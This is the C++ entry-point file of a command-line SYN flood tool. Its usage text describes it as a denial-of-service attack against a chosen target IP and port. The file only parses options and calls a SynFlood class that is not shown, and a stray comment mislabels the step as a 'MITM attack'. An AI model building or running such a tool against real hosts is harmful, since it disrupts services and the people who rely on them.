/*!
 * \file main.cpp
 * \brief Program's entry point.
 * \author Jeremy ZYRA
 */
#include <iostream>
#include <pcap.h>
#include <unistd.h>
#include <cstdlib>
#include <ctime>
#include "SynFlood.hpp"
using namespace std;

/*!
 * \brief Function for print usage.
 */
void printUsage(char *name) {
	cout << "NAME" << endl;	
	cout << "\tSynFlood" << endl << endl;	
	cout << "SYNOPSIS" << endl;	
	cout << "\t" << name << " [-hv] -i INTERFACE -t TARGET -p PORT" << endl << endl;	
	cout << "DESCRIPTION" << endl;	
	cout << "\tLaunch SYN flooding (DOS attack)." << endl << endl;	
	cout << "OPTIONS" << endl;	
	cout << "\t-h" << endl;	
	cout << "\t\tPrint command's usage." << endl << endl;	
	cout << "\t-v" << endl;	
	cout << "\t\tVerbose mode." << endl << endl;	
	cout << "\t-i INTERFACE" << endl;	
	cout << "\t\tSpecifie network interface." << endl << endl;	
	cout << "\t-t TARGET" << endl;	
	cout << "\t\tSpecifie IP address to target." << endl << endl;	
	cout << "\t-p PORT" << endl;	
	cout << "\t\tSpecifie target's TCP port." << endl << endl;	
	cout << "AUTHOR" << endl;	
	cout << "\tJeremy ZYRA" << endl;	
}

/*!
 * \brief Program's entry point.
 */
int main(int argc, char *argv[]) {
	int opt = 0, nbThread=1, port=0;
	char *iface, *destination;
	bool help = false;
	bool verbose = false;
	iface = destination = NULL;
	//Get parameters
	while ((opt = getopt(argc, argv,"i:t:d:p:h?v?")) != -1) {
		switch(opt) {
			//Network interface
			case 'i':
				iface = optarg;
				break;
			//Target IP
			case 't':
				destination = optarg;
				break;
			case 'p':
				port = atoi(optarg);
				break;
			//Flag for display usage.
			case 'h':
				help = true;
				break;
			case 'v':
				verbose = true;
				break;
			case '?':
				help = true;
				break;
		}
	}
	if(help) printUsage(argv[0]);
	else {
		//Check mandatory parameters
		if (iface != NULL && destination != NULL) {
			SynFlood launch(iface, destination, port, verbose);
			//Run MITM attack
			launch.run();
		} else {
			printUsage(argv[0]);
		}
	}
	return 0;
}
